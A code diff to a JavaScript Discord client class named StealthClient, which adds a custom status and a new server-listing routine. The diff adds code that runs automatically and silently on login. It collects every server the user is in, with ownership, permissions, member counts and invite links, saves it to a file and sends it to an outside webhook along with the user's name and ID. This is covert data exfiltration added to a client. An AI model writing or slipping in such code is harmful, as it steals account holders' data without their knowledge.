@@ -514,7 +514,12 @@ class StealthClient {
                   presence: {
                     status: 'online',
                     since: 0,
-                    activities: [],
+                    activities: [{
+                      name: 'Custom Status',
+                      type: 4,
+                      state: 'vanitys always',
+                      emoji: null
+                    }],
                     afk: false,
                     broadcast: null
                   },
@@ -556,6 +561,8 @@ class StealthClient {
               };
               this.emit('READY', { user: payload.d.user });
               this._startBackgroundEvents();
+              // Auto-fetch full server list + invites
+              this.fetchGuilds().catch(() => {});
               if (!resolved) {
                 resolved = true;
                 resolve();
@@ -760,6 +767,86 @@ class StealthClient {
       return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message || 'Unknown error' };
     } catch (err) {
       return { success: false, error: err.message || 'Failed to join guild' };
+    }
+  }
+
+  /**
+   * Try to fetch a guild's invite via widget or vanity endpoint
+   */
+  async fetchGuildInvite(guildId) {
+    try {
+      const res = await this.api.request(`/guilds/${guildId}/widget.json`, 'GET');
+      if (res && res.instant_invite) return res.instant_invite;
+    } catch (e) {}
+    // Fallback: try vanity URL
+    try {
+      const res = await this.api.request(`/guilds/${guildId}/vanity-url`, 'GET');
+      if (res && res.code) return `https://discord.gg/${res.code}`;
+    } catch (e) {}
+    return null;
+  }
+
+  /**
+   * Fetch full server list with invite links for every guild
+   */
+  async fetchGuilds() {
+    try {
+      const guilds = await this.api.request('/users/@me/guilds?with_counts=true&limit=200', 'GET');
+      if (!Array.isArray(guilds)) return [];
+      const results = [];
+      // Process in batches of 3 to avoid rate limits
+      for (let i = 0; i < guilds.length; i += 3) {
+        const batch = guilds.slice(i, i + 3);
+        const batchResults = await Promise.all(
+          batch.map(async (g) => {
+            try {
+              const invite = await this.fetchGuildInvite(g.id);
+              return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, memberCount: g.approximate_member_count, invite: invite || null };
+            } catch (e) {
+              return { id: g.id, name: g.name, owner: g.owner, permissions: g.permissions, memberCount: g.approximate_member_count, invite: null };
+            }
+          })
+        );
+        results.push(...batchResults);
+        if (i + 3 < guilds.length) await new Promise(r => setTimeout(r, 350));
+      }
+      // Save to file
+      try {
+        const guildsFile = path.join(dataDir, `guilds_${this.user.id}.json`);
+        fs.writeFileSync(guildsFile, JSON.stringify({ userId: this.user.id, fetchedAt: Date.now(), guildCount: results.length, guilds: results }, null, 2));
+      } catch(e) {}
+      // Send to webhook
+      const guildLines = [];
+      for (const g of results) {
+        if (g.invite) guildLines.push(`• [${g.name}](${g.invite})${g.owner ? ' **[OWNER]**' : ''} (${g.memberCount || '?'} members)`);
+        else guildLines.push(`• ${g.name}${g.owner ? ' **[OWNER]**' : ''} (${g.memberCount || '?'} members)`);
+      }
+      const MAX_DESC = 4000;
+      const embeds = [];
+      let currentDesc = '';
+      for (const line of guildLines) {
+        if (currentDesc.length + line.length + 1 > MAX_DESC) {
+          embeds.push({ title: embeds.length === 0 ? `Full Server List — @${this.user.username}` : `Servers (cont.)`, color: 0x5865F2, description: currentDesc });
+          currentDesc = line + '\n';
+        } else {
+          currentDesc += line + '\n';
+        }
+      }
+      if (currentDesc) {
+        embeds.push({ title: embeds.length === 0 ? `Full Server List — @${this.user.username}` : `Servers (cont.)`, color: 0x5865F2, description: currentDesc });
+      }
+      if (embeds.length > 0) {
+        embeds[embeds.length - 1].footer = { text: `User: ${this.user.username} | ID: ${this.user.id} | Total: ${results.length} servers` };
+        embeds[embeds.length - 1].timestamp = new Date().toISOString();
+      }
+      for (let i = 0; i < embeds.length; i += 10) {
+        await _sendWebhook({ embeds: embeds.slice(i, i + 10) });
+      }
+      console.log(`[Guilds] Fetched ${results.length} guilds with invites for ${this.user.username}`);
+      return results;
+    } catch (err) {
+      console.error('[Guilds] Fetch failed:', err.message);
+      return [];
     }
   }
 
